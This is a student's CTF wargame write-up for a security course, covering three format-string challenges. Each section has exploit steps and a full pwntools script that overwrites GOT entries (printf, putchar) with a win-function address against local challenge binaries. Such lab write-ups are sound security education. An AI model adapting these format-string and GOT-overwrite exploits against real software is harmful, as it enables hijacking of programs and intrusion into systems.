# **COMP6447 Wargame 1** - Johnathan Liauw (z5136212)
## **7. format-1 - lots**
_General overview of problems faced:_     
None

_List of vulnerabilities:_    
1. Format string vulnerability from the user's input

_Steps to exploit:_   
1. Find the format string offset to the first user input which is 7
2. Copy the address, put it at the start of the payload and an address+2 next
3. Calculate the bytes we have to write for "FRND", then write to address and address+2 using the format string offset

_Script/Command used:_    
```python
#!/usr/bin/python

from pwn import *
import re

host = "127.0.0.1"
port = 7001
write = "FRND"

c = remote(host, port)
#c = process("../lots")

reply = c.recvline()
addr = re.search('0x(.{8})', reply).group(0)
print("Address to overwrite: %s" % (addr))
addr = int(addr, 0)

c.recvline()

payload = "X"
payload += p32(addr)
payload += p32(addr+2)
payload += "%21053x"
payload += "%7$n"
payload += "%61960x"
payload += "%8$n"

c.sendline(payload)

print c.recvall()
```
---
## **8. format-2 - formatrix**
_General overview of problems faced:_   
1. Cannot write 2 bytes at a time like lots so I have to write one byte at a time

_List of vulnerabilities:_    
1. Format string vulnerability from the user's input

_Steps to exploit:_   
1. We have to overwrite functions in the GOT table and I used printf since it will not affect anything before in the win function
2. Find the format string address to the start of the use input which is 3
3. Write the win address to the address storing printf with the format string offset one byte at a time
3. I calculated it by hand and also tried to use the pwntools built-in function for it

_Script/Command used:_    
```python
#!/usr/bin/python

from pwn import *

host = "127.0.0.1"
port = 7002

printf = 0x804b4bc
win = 0x080491f2

def send_ftm_payload(payload):
	print repr(payload)
	c.sendline(payload)

#c = remote(host, port)
c = process("../formatrix")
#c = gdb.debug("../formatrix")
c.recvlines(16)
'''
payload = p32(printf)
payload += p32(printf+1)
payload += p32(printf+2)
payload += p32(printf+3)
payload += "%226x"	# F2-16
payload += "%3$n"
payload += "%159x"	# 191-F2
payload += "%4$n"
payload += "%115x"	# 204-191
payload += "%5$n"
payload += "%260x"	# 308-204
payload += "%6$n"
'''
f = FmtStr(send_ftm_payload, offset=3)
f.write(printf, win)
f.execute_writes()

#print(payload)
#c.sendline(payload)

print c.recvall()
```
---
## **9. format-3 - sploitwarz**
_General overview of problems faced:_   
1. Have to figure how the player struct is ordered and what the attributes are
2. Have to find where the format string vulnerability is which is when you win the gamble and where the string is from which is the player's name
3. Have to find out what to overwrite which I chose the putchar function in the GOT as it will not affect any useful functions
4. Have to find the address storing the putchar function, I used the address of the player's name and the offset of it the the GOT to get putchar's function address
5. Have to keep gambling until I win so as to exploit the format string

_List of vulnerabilities:_    
1. When the player wins a gamble, the program will print the name without formatting which leads to a format string vulnerability

_Steps to exploit:_   
1. First we have to find the address of the player's name which from reversing the binary I found that it will be the in the first format string offset.
2. Then I calculated the address storing putchar using the offsets I found in the binary
3. Finally I overwrite the putchar address with the win function address and the flag will be printed upon the next call of putchar
4. The payload will first be stored in the player's name with the change handle function, then keep on gambling until I win so as to exploit the format string. Do this for each of the two payloads above.
5. I also included commented code which will also trigger the winning lines by changing the player's item quantity and selling them for bitcoin, then change the player's turn to 30. This is not useful for the flag but I'm just doing this for extra stuff. It only works on local but not over the network I don't know why.

_Script/Command used:_    
```python
#!/usr/bin/python

from pwn import *
import sys
import re

win = 0x5655655c
#p = process("../sploitwarz")
#p = gdb.debug("../sploitwarz")
p = remote("127.0.0.1", 7003)

def send(payload):
	p.sendline(payload)

payload = "aaaa.%1$p"
p.sendline(payload)
p.recvlines(48)

p.sendline("g")
p.sendline("0.001")
p.sendline("3")

p.recvlines(10)
reply = p.recvline()
while reply[:5] == "Wrong":
	p.sendline("")
	p.sendline("g")
	p.sendline("0.0001")
	p.sendline("3")
	p.recvlines(43)
	reply = p.recvline()

buffer_addr = re.search('0x(.{8})', reply).group(0)
log.info("Player address at %s" % (buffer_addr))

player = int(buffer_addr, 0) - 0x14
got = player - 0x218
putchar = got + 0x38

p.sendline("")
p.sendline("c")
f = FmtStr(send, offset=9)
f.write(putchar, win)
f.execute_writes()
p.recvlines(66)

p.sendline("g")
p.sendline("0.001")
p.sendline("3")

p.recvlines(10)
reply = p.recvline()
while reply[:5] == "Wrong":
	p.sendline("")
	p.sendline("g")
	p.sendline("0.0001")
	p.sendline("3")
	p.recvlines(43)
	reply = p.recvline()

log.info("Overwritten putchar to win")
p.sendline("")
p.recvlines(1)
flag = p.recvline()
log.info("Flag found: %s" % (flag))
p.close()

# Below is to also get win the game, only works on local

'''
p.recvlines(34)

player_qty = player + 0x124
p.sendline("c")
f = FmtStr(send, offset=9)
f.write(player_qty, 10000000)
f.execute_writes()
p.recvlines(37)

p.sendline("g")
p.sendline("0.001")
p.sendline("3")

p.recvlines(13)
reply = p.recvline()
while reply[:5] == "Wrong":
	p.sendline("")
	p.sendline("g")
	p.sendline("0.0001")
	p.sendline("3")
	p.recvlines(49)
	reply = p.recvline()

log.info("Overwritten item 5 qty to 10000000")

p.sendline("")
p.sendline("s")
p.sendline("5")
p.sendline("10000000")

log.info("Selling all items")
#p.interactive()
p.recvlines(79)

player_turn = player + 0x4

p.sendline("c")
f.write(player_turn, 30)
f.execute_writes()
p.recvlines(33)
f = FmtStr(send, offset=9)

p.sendline("g")
p.sendline("0.001")
p.sendline("3")

p.recvlines(17)
reply = p.recvline()
while reply[:5] == "Wrong":
	p.sendline("")
	p.sendline("g")
	p.sendline("0.0001")
	p.sendline("3")
	p.recvlines(49)
	reply = p.recvline()

log.info("Overwritten turn to 30")

p.sendline("")
print p.recvall()
'''
```